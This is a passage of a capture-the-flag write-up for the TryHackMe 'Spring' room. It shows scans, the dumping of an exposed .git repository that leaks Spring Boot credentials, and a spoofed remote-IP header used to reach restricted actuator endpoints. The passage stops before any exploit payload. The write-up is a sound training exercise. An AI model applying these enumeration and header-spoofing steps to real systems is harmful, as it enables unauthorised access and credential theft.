# Spring

Can you hack your way in to a Hello World application?

[Spring](https://tryhackme.com/room/spring)

## Topic's

- Network Enumeration
- Web Enumeration
- Git Enumeation
- Exploitation (Spring Boot)
- Brute Forcing (Hash)
- Brute Forcing (SSH Key)

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Spring

This machine may take up to 5 minutes to fully deploy.

John created a simple Hello World Web Application, he is still learning.

See if you can find a way to hack him.

```
kali@kali:~/CTFs/tryhackme/Spring$ sudo nmap -A -sS -sC -sV -O 10.10.6.25
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-20 11:24 CEST
Nmap scan report for 10.10.6.25
Host is up (0.034s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE   VERSION
22/tcp  open  ssh       OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 89:a8:db:e1:3d:ab:0e:ea:da:d8:8d:a7:bc:56:fc:da (RSA)
|   256 7d:b2:aa:19:18:31:6c:62:18:7b:3b:96:11:02:54:9d (ECDSA)
|_  256 26:32:b9:96:69:a8:cb:14:b4:8c:e8:f0:d5:74:bd:6e (ED25519)
80/tcp  open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 302
|     Cache-Control: private
|     Expires: Thu, 01 Jan 1970 00:00:00 GMT
|     Location: https://localhost/
|     Content-Length: 0
|     Date: Tue, 20 Oct 2020 09:24:35 GMT
|     Connection: close
|   RTSPRequest, X11Probe:
|     HTTP/1.1 400
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Tue, 20 Oct 2020 09:24:35 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400
|_    Request</h1></body></html>
|_http-title: Did not follow redirect to https://10.10.6.25/
443/tcp open  ssl/https
|_http-title: Site doesn't have a title (text/plain;charset=UTF-8).
|_ssl-date: 2020-10-20T09:25:27+00:00; +1s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.80%I=7%D=10/20%Time=5F8EACD3%P=x86_64-pc-linux-gnu%r(Get
SF:Request,BA,"HTTP/1\.1\x20302\x20\r\nCache-Control:\x20private\r\nExpire
SF:s:\x20Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nLocation:\x20http
SF:s://localhost/\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2020\x20Oct\x2
SF:02020\x2009:24:35\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(HTTPOption
SF:s,BA,"HTTP/1\.1\x20302\x20\r\nCache-Control:\x20private\r\nExpires:\x20
SF:Thu,\x2001\x20Jan\x201970\x2000:00:00\x20GMT\r\nLocation:\x20https://lo
SF:calhost/\r\nContent-Length:\x200\r\nDate:\x20Tue,\x2020\x20Oct\x202020\
SF:x2009:24:35\x20GMT\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,24E,
SF:"HTTP/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nCo
SF:ntent-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2020\
SF:x20Oct\x202020\x2009:24:35\x20GMT\r\nConnection:\x20close\r\n\r\n<!doct
SF:ype\x20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20
SF:\xe2\x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">body\
SF:x20{font-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20
SF:{color:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h
SF:2\x20{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12
SF:px;}\x20a\x20{color:black;}\x20\.line\x20{height:1px;background-color:#
SF:525D76;border:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\
SF:xe2\x80\x93\x20Bad\x20Request</h1></body></html>")%r(X11Probe,24E,"HTTP
SF:/1\.1\x20400\x20\r\nContent-Type:\x20text/html;charset=utf-8\r\nContent
SF:-Language:\x20en\r\nContent-Length:\x20435\r\nDate:\x20Tue,\x2020\x20Oc
SF:t\x202020\x2009:24:35\x20GMT\r\nConnection:\x20close\r\n\r\n<!doctype\x
SF:20html><html\x20lang=\"en\"><head><title>HTTP\x20Status\x20400\x20\xe2\
SF:x80\x93\x20Bad\x20Request</title><style\x20type=\"text/css\">body\x20{f
SF:ont-family:Tahoma,Arial,sans-serif;}\x20h1,\x20h2,\x20h3,\x20b\x20{colo
SF:r:white;background-color:#525D76;}\x20h1\x20{font-size:22px;}\x20h2\x20
SF:{font-size:16px;}\x20h3\x20{font-size:14px;}\x20p\x20{font-size:12px;}\
SF:x20a\x20{color:black;}\x20\.line\x20{height:1px;background-color:#525D7
SF:6;border:none;}</style></head><body><h1>HTTP\x20Status\x20400\x20\xe2\x
SF:80\x93\x20Bad\x20Request</h1></body></html>");
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/20%OT=22%CT=1%CU=39449%PV=Y%DS=2%DC=T%G=Y%TM=5F8EAD
OS:42%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10F%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT      ADDRESS
1   36.19 ms 10.8.0.1
2   36.27 ms 10.10.6.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.73 seconds
```

```
kali@kali:~/CTFs/tryhackme/Spring$ sudo /opt/dirsearch/dirsearch.py -u https://10.10.6.25/ -t 200 -E -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r -R 5

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 200 | Wordlist size: 220520 | Recursion level: 5

Error Log: /opt/dirsearch/logs/errors-20-10-20_11-27-43.log

Target: https://10.10.6.25/

Output File: /opt/dirsearch/reports/10.10.6.25/_20-10-20_11-27-43.txt

[11:27:43] Starting:
[11:27:58] 302 -    0B  - /sources  ->  /sources/     (Added to queue)
[11:30:57] 400 -  435B  - /http%3A%2F%2Fwww
CTRL+C detected: Pausing threads, please wait...

Canceled by the user
```

```
kali@kali:~/CTFs/tryhackme/Spring$ sudo /opt/dirsearch/dirsearch.py -u https://10.10.6.25/sources/new/ -t 200 -E -r -R 5

  _|. _ _  _  _  _ _|_    v0.4.0
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, jspx, html, htm, js | HTTP method: GET | Threads: 200 | Wordlist size: 10457 | Recursion level: 5

Error Log: /opt/dirsearch/logs/errors-20-10-20_11-33-15.log

Target: https://10.10.6.25/sources/new/

Output File: /opt/dirsearch/reports/10.10.6.25/sources.new_20-10-20_11-33-15.txt

[11:33:15] Starting:
[11:33:18] 200 -  148B  - /sources/new/.git/config
[11:33:18] 200 -  401B  - /sources/new/.git/COMMIT_EDITMSG
[11:33:19] 200 -  240B  - /sources/new/.git/info/exclude
[11:33:19] 200 -    1KB - /sources/new/.git/index
[11:33:19] 302 -    0B  - /sources/new/.git/logs/refs  ->  /sources/new/.git/logs/refs/     (Added to queue)
[11:33:19] 302 -    0B  - /sources/new/.git/logs/refs/heads  ->  /sources/new/.git/logs/refs/heads/     (Added to queue)
[11:33:19] 200 -   73B  - /sources/new/.git/description
[11:33:19] 200 -  319B  - /sources/new/.git/logs/refs/heads/master
[11:33:19] 302 -    0B  - /sources/new/.git/refs/heads  ->  /sources/new/.git/refs/heads/     (Added to queue)
[11:33:19] 302 -    0B  - /sources/new/.git/refs/tags  ->  /sources/new/.git/refs/tags/     (Added to queue)
[11:33:19] 200 -   41B  - /sources/new/.git/refs/heads/master
[11:33:24] 400 -  435B  - /sources/new/a%5c.aspx
CTRL+C detected: Pausing threads, please wait...

Canceled by the user
```

```
kali@kali:~/CTFs/tryhackme/Spring$ mkdir git_data
kali@kali:~/CTFs/tryhackme/Spring$ /opt/git-dumper/git-dumper.py https://10.10.6.25/sources/new/.git/ ./git_data/
[-] Testing https://10.10.6.25/sources/new/.git/HEAD [200]
[-] Testing https://10.10.6.25/sources/new/.git/ [404]
[-] Fetching common files
[-] Fetching https://10.10.6.25/sources/new/.git/description [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-update.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/COMMIT_EDITMSG [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-applypatch.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-commit.sample [404]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/commit-msg.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-push.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/applypatch-msg.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-commit.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-rebase.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/post-receive.sample [404]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/pre-receive.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching https://10.10.6.25/sources/new/.gitignore [200]
[-] Fetching https://10.10.6.25/sources/new/.git/index [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/info/packs [404]
[-] Fetching https://10.10.6.25/sources/new/.git/info/exclude [200]
[-] Fetching https://10.10.6.25/sources/new/.git/hooks/update.sample [200]
[-] Finding refs/
[-] Fetching https://10.10.6.25/sources/new/.git/HEAD [200]
[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/remotes/origin/HEAD [404]
[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/stash [404]
[-] Fetching https://10.10.6.25/sources/new/.git/FETCH_HEAD [404]
[-] Fetching https://10.10.6.25/sources/new/.git/info/refs [404]
[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/remotes/origin/master [404]
[-] Fetching https://10.10.6.25/sources/new/.git/config [200]
[-] Fetching https://10.10.6.25/sources/new/.git/ORIG_HEAD [404]
[-] Fetching https://10.10.6.25/sources/new/.git/logs/HEAD [200]
[-] Fetching https://10.10.6.25/sources/new/.git/logs/refs/heads/master [200]
[-] Fetching https://10.10.6.25/sources/new/.git/packed-refs [404]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/heads/master [200]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/remotes/origin/HEAD [404]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/remotes/origin/master [404]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/stash [404]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/wip/wtree/refs/heads/master [404]
[-] Fetching https://10.10.6.25/sources/new/.git/refs/wip/index/refs/heads/master [404]
[-] Finding packs
[-] Finding objects
[-] Fetching objects
[-] Fetching https://10.10.6.25/sources/new/.git/objects/92/b433a86a015517f746a3437ba3802be9146722 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/00/00000000000000000000000000000000000000 [404]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/b4/63ef229486f86eeb72b89539bd3339e485807f [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/d5/c72b751a3a756eb27f4f07664842d252dc4928 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/66/058471882cd13e7e1229d7df0ecb1437b61e78 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/29/e4f3b4e2234b489d695f8c262c1b4a1b6f6e9a [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/a9/f778a7a964b6f01c904ee667903f005d6df556 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/9a/8d7e300995dabbb2f0ab9a117f2ee02068aa8d [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/eb/f1ef86a29a04cc7ad00bdbc656056a6250e3f6 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/8f/8904743c007a1542d0047be84912b7aa15279f [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/6b/d070178569781eb0534f575e52157aa59a501e [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/5d/eeca1fbb8b02b7a5fbf1776a9b6fc803afda32 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/06/e4e487ea33b438eddd5f01d01980e8eb483d54 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/93/407ced89dfa0d7e574bb117c6bbee7a0d40bc9 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/1a/83ec34bf5ab3a89096346c46f6fda2d26da7e6 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/71/e18111b0f82be167bcdf44501c40552d9e10ad [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/e4/9a401d2e07d18bbd9bfc492d71c4467d16d2b3 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/0f/4ff745b9480ab23ff47a25542e16094117c35a [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/0a/e5a6c68f4da02b8cb399eb0b90ead4272d7cd1 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/39/858db3349ea85bfc5b0120dc5d2ca45f0683af [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/6d/e5c4c83edbf094c885d02be5f275f589d452ac [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/bf/ee42398426f27ae8511e6f4e613207854fdb6d [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/6f/b8af92ee8f251b33184e01597255e87459ecb7 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/67/3abbf42bad7eff6574b6ea8759cea232cf63e7 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/a4/c5e5165ecd93acf7f243da71430d4edcc2c780 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/5a/89f76e57f381e38efa3179fd69cf8ee7fd1e54 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/fc/719eba62e24fd379fd44dc35f1ab25f49ef231 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/cc/f5992a16348d803da54a48aa64f24f81569380 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/0c/304b129922b9739c4193b9a9b71b3050a0867d [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/fd/861389321333ed895fe9c22a79254db774a150 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/5e/a2aaeb59bb380f001a3a1569bb127d4834152a [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/98/c8673dc8c0250e15f6a4c4ac7f90a7c8555dbb [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/69/871575a847bfef00491cd5912a59682b427525 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/80/c24d20f6bb44e6e2d16aaf133f866a2182f597 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/3d/b1ee8004fe3cad3b3637e018abdf443e328e3a [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/fe/e60fff5d20f703d74d02fa9a57ed364d9210ee [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/f6/d1a5ff67503ff152c3be8db995939e22f20da6 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/f0/f2f7760ac45cfeb34ced824b2abfbc6e436000 [200]
[-] Fetching https://10.10.6.25/sources/new/.git/objects/7b/8c746815c823dc9983dc27fc31e69dac3c7bf1 [200]
[-] Running git checkout .
kali@kali:~/CTFs/tryhackme/Spring$ cd git_data/
kali@kali:~/CTFs/tryhackme/Spring/git_data$ git log
commit 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6 (HEAD -> master)
Author: John Smith <johnsmith@spring.thm>
Date:   Fri Jul 10 18:13:55 2020 +0000

    added greeting
    changed security password to my usual format

commit 92b433a86a015517f746a3437ba3802be9146722
Author: John Smith <johnsmith@spring.thm>
Date:   Sat Jul 4 23:53:25 2020 +0000

    Hello world
kali@kali:~/CTFs/tryhackme/Spring/git_data$ git reset --hard 1a83ec34bf5ab3a89096346c46f6fda2d26da7e6
HEAD is now at 1a83ec3 added greeting changed security password to my usual format
kali@kali:~/CTFs/tryhackme/Spring/git_data$ find . -ls |grep -v \\.git
  1449991      4 drwxr-xr-x   5 kali     kali         4096 Oct 20 11:34 .
  1450039      4 -rw-r--r--   1 kali     kali           28 Oct 20 11:34 ./settings.gradle
  1450038      4 -rw-r--r--   1 kali     kali         3058 Oct 20 11:34 ./gradlew.bat
  1450037      8 -rw-r--r--   1 kali     kali         5441 Oct 20 11:34 ./gradlew
  2621980      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src
  2621981      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src/main
  2621982      4 drwxr-xr-x   4 kali     kali         4096 Oct 20 11:34 ./src/main/java
  2621985      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/main/java/com
  2621986      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/main/java/com/onurshin
  2621987      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/java/com/onurshin/spring
  2621988      8 -rw-r--r--   1 kali     kali         4350 Oct 20 11:34 ./src/main/java/com/onurshin/spring/Application.java
  2621983      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/java/META-INF
  2621984      4 -rw-r--r--   1 kali     kali           70 Oct 20 11:34 ./src/main/java/META-INF/MANIFEST.MF
  2621989      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/main/resources
  2621990      4 -rw-r--r--   1 kali     kali         1007 Oct 20 11:34 ./src/main/resources/application.properties
  2621991      4 -rw-r--r--   1 kali     kali         2581 Oct 20 11:34 ./src/main/resources/dummycert.p12
  2621992      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test
  2621993      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java
  2621994      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java/com
  2621995      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./src/test/java/com/onurshin
  2621996      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./src/test/java/com/onurshin/spring
  2621997      4 -rw-r--r--   1 kali     kali          214 Oct 20 11:34 ./src/test/java/com/onurshin/spring/ApplicationTests.java
  1450036      4 drwxr-xr-x   3 kali     kali         4096 Oct 20 11:34 ./gradle
  2621978      4 drwxr-xr-x   2 kali     kali         4096 Oct 20 11:34 ./gradle/wrapper
  2621979      4 -rw-r--r--   1 kali     kali          238 Oct 20 11:34 ./gradle/wrapper/gradle-wrapper.properties
  1450035      4 -rw-r--r--   1 kali     kali         1151 Oct 20 11:34 ./build.gradle
kali@kali:~/CTFs/tryhackme/Spring/git_data$ cat build.gradle
plugins {
    id 'org.springframework.boot' version '2.3.1.RELEASE'
    id 'io.spring.dependency-management' version '1.0.9.RELEASE'
    id 'java'
}

group = 'com.onurshin'
version = '0.0.1-SNAPSHOT'
sourceCompatibility = '1.8'

repositories {
    mavenCentral()
}

ext {
    set('springCloudVersion', "Greenwich.SR4")
}
dependencies {
    implementation 'org.springframework.boot:spring-boot-starter-actuator'
    implementation 'org.springframework.boot:spring-boot-starter-web'
    implementation 'org.springframework.boot:spring-boot-starter-security'
    implementation 'org.springframework.boot:spring-boot-starter-data-jpa'

    implementation 'org.springframework.cloud:spring-cloud-starter-config'
    runtimeOnly 'com.h2database:h2'

    testImplementation('org.springframework.boot:spring-boot-starter-test') {
        exclude group: 'org.junit.vintage', module: 'junit-vintage-engine'
    }
    testImplementation 'org.springframework.security:spring-security-test'
}

dependencyManagement {
    imports {
        mavenBom "org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}"
    }
}
test {
    useJUnitPlatform()
}
```

```
kali@kali:~/CTFs/tryhackme/Spring/git_data$ ls -la src/main/java/com/onurshin/spring/
total 16
drwxr-xr-x 2 kali kali 4096 Oct 20 11:34 .
drwxr-xr-x 3 kali kali 4096 Oct 20 11:34 ..
-rw-r--r-- 1 kali kali 4350 Oct 20 11:34 Application.java
kali@kali:~/CTFs/tryhackme/Spring/git_data$ cat src/main/java/com/onurshin/spring/Application.java
package com.onurshin.spring;

import org.apache.catalina.Context;
import org.apache.catalina.Wrapper;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.util.descriptor.web.SecurityCollection;
import org.apache.tomcat.util.descriptor.web.SecurityConstraint;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration;
import org.springframework.boot.web.embedded.tomcat.TomcatServletWebServerFactory;
import org.springframework.boot.web.embedded.tomcat.TomcatWebServer;
import org.springframework.boot.web.servlet.server.ServletWebServerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.security.config.annotation.web.builders.HttpSecurity;
import org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;
import org.springframework.security.config.annotation.web.configuration.WebSecurityConfigurerAdapter;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.RestController;

@SpringBootApplication(exclude = {ErrorMvcAutoConfiguration.class})
public class Application {

    public static void main(String[] args) {
        SpringApplication.run(Application.class, args);
    }

    @RestController
    //https://spring.io/guides/gs/rest-service/
    static class HelloWorldController {
        @RequestMapping("/")
        public String hello(@RequestParam(value = "name", defaultValue = "World") String name) {
            System.out.println(name);
            return String.format("Hello, %s!", name);
        }
    }


    private Connector redirectConnector() {
        Connector connector = new Connector("org.apache.coyote.http11.Http11NioProtocol");
        connector.setScheme("http");
        connector.setPort(80);
        connector.setSecure(false);
        connector.setRedirectPort(443);
        return connector;
    }

    @Bean
    public ServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory factory = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
                context.setUseHttpOnly(true);
            }

            @Override
            protected TomcatWebServer getTomcatWebServer(Tomcat tomcat) {
                Context context = tomcat.addContext("/sources", "/opt/spring/sources/");
                context.setParentClassLoader(getClass().getClassLoader());
                context.setUseHttpOnly(true);

                Wrapper defaultServlet = context.createWrapper();
                defaultServlet.setName("default");
                defaultServlet.setServletClass("org.apache.catalina.servlets.DefaultServlet");
                defaultServlet.addInitParameter("debug", "0");
                defaultServlet.addInitParameter("listings", "false");
                defaultServlet.setLoadOnStartup(1);
                defaultServlet.setOverridable(true);
                context.addChild(defaultServlet);
                context.addServletMappingDecoded("/", "default");

                return super.getTomcatWebServer(tomcat);
            }
        };
        factory.addAdditionalTomcatConnectors(redirectConnector());
        return factory;
    }

    @Configuration
    @EnableWebSecurity
    static class SecurityConfig extends WebSecurityConfigurerAdapter {

        @Override
        protected void configure(HttpSecurity http) throws Exception {
            http
                    .authorizeRequests()
                    .antMatchers("/actuator**/**").hasIpAddress("172.16.0.0/24")
                    .and().csrf().disable();
        }

    }
}
```

```
kali@kali:~/CTFs/tryhackme/Spring/git_data$ curl https://10.10.6.25/?name=pentester -k
Hello, pentester!
```

```
kali@kali:~/CTFs/tryhackme/Spring/git_data$ cat src/main/resources/application.properties
server.port=443
server.ssl.key-store=classpath:dummycert.p12
server.ssl.key-store-password=DummyKeystorePassword123.
server.ssl.keyStoreType=PKCS12
management.endpoints.enabled-by-default=true
management.endpoints.web.exposure.include=health,env,beans,shutdown,mappings,restart
management.endpoint.env.keys-to-sanitize=
server.forward-headers-strategy=native
server.tomcat.remoteip.remote-ip-header=x-9ad42dea0356cb04
server.error.whitelabel.enabled=false
spring.autoconfigure.exclude=org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfiguration
server.servlet.register-default-servlet=true
spring.mvc.ignore-default-model-on-redirect=true
spring.security.user.name=johnsmith
spring.security.user.password=PrettyS3cureSpringPassword123.
debug=false
spring.cloud.config.uri=
spring.cloud.config.allow-override=true
management.endpoint.heapdump.enabled=false
spring.resources.static-locations=classpath:/META-INF/resources/, classpath:/resources/, classpath:/static/, classpath:/public/
```

```
kali@kali:~/CTFs/tryhackme/Spring$ curl https://10.10.6.25/actuator/ -H 'x-9ad42dea0356cb04: 172.16.0.21' -k -v
*   Trying 10.10.6.25:443...
* Connected to 10.10.6.25 (10.10.6.25) port 443 (#0)
* ALPN, offering h2
* ALPN, offering http/1.1
* successfully set certificate verify locations:
*   CAfile: /etc/ssl/certs/ca-certificates.crt
  CApath: /etc/ssl/certs
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* TLSv1.3 (IN), TLS handshake, Server hello (2):
* TLSv1.2 (IN), TLS handshake, Certificate (11):
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
* TLSv1.2 (IN), TLS handshake, Server finished (14):
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
* TLSv1.2 (OUT), TLS handshake, Finished (20):
* TLSv1.2 (IN), TLS handshake, Finished (20):
* SSL connection using TLSv1.2 / ECDHE-RSA-AES256-GCM-SHA384
* ALPN, server did not agree to a protocol
* Server certificate:
*  subject: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  start date: Jul  4 15:33:44 2020 GMT
*  expire date: Apr 18 15:33:44 2294 GMT
*  issuer: C=Unknown; ST=Unknown; L=Unknown; O=spring.thm; OU=Unknown; CN=John Smith
*  SSL certificate verify result: self signed certificate (18), continuing anyway.
> GET /actuator/ HTTP/1.1
> Host: 10.10.6.25
> User-Agent: curl/7.72.0
> Accept: */*
> x-9ad42dea0356cb04: 172.16.0.21
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200
< Cache-Control: private
< Expires: Thu, 01 Jan 1970 00:00:00 GMT
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< Strict-Transport-Security: max-age=31536000 ; includeSubDomains
< X-Frame-Options: DENY
< Content-Type: application/vnd.spring-boot.actuator.v3+json
< Transfer-Encoding: chunked
< Date: Tue, 20 Oct 2020 10:00:27 GMT
<
* Connection #0 to host 10.10.6.25 left intact
```

```json
{
  "_links": {
    "self": { "href": "https://10.10.6.25/actuator", "templated": false },
    "beans": {
      "href": "https://10.10.6.25/actuator/beans",
      "templated": false
    },
    "health": {
      "href": "https://10.10.6.25/actuator/health",
      "templated": false
    },
    "health-path": {
      "href": "https://10.10.6.25/actuator/health/{*path}",
      "templated": true
    },
    "shutdown": {
      "href": "https://10.10.6.25/actuator/shutdown",
      "templated": false
    },
    "env-toMatch": {
      "href": "https://10.10.6.25/actuator/env/{toMatch}",
      "templated": true
    },
    "env": { "href": "https://10.10.6.25/actuator/env", "templated": false },
    "mappings": {
      "href": "https://10.10.6.25/actuator/mappings",
      "templated": false
    },
    "restart": {
      "href": "https://10.10.6.25/actuator/restart",
      "templated": false
    }
  }
}
```

[https://www.veracode.com/blog/research/exploiting-spring-boot-actuators](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)

```bash
